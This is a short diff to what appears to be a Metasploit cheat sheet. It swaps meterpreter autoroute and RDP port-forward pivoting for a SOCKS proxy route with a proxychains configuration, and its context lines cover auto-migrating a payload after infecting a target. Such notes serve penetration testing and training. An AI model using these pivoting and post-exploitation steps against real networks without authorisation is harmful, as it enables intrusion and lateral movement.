@@ -28,15 +28,17 @@ msf> to_handler
 # automigrate to another process, directly after infecting target
 msf> set AutoRunScript post/windows/manage/migrate
 
-# add route for pivoting via meterpreter
-msf> sessions -i <n>
-msf> autoroute -s 
-msf> run
-
-# connect RDP via meterpreter pivot
-mtr> portfwd add -l <localPort> -p <rport> -r <rhost>
-rdesktop <rhost:rhost>
-
 # tunnel traffic trough proxy
 set PROXIES HTTP:127.0.0.1:8080
+
+# pivoting using proxychains
+msf> auxiliary/server/socks_proxy
+msf> set version 4a
+msf> route add <ipRange> <sessionId>
+msf> run -j
+
+# adjust listening port
+sudo vim /etc/proxychains4.conf
+# insert
+socks4 	127.0.0.1 1080
 
